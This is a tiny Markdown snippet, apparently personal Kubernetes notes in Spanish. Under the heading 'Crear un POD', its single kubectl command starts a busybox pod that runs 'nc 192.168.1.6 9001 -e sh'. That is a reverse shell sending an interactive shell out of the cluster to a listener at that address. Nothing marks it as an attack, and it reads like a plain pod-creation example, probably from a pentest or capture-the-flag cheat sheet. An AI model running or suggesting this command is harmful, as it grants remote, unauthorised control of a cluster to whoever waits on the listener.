# K8s

### POD

"" Crear un POD
```bash
kubectl run pod1 --image=busybox -- /bin/sh -c "busybox nc 192.168.1.6 9001 -e sh"
```
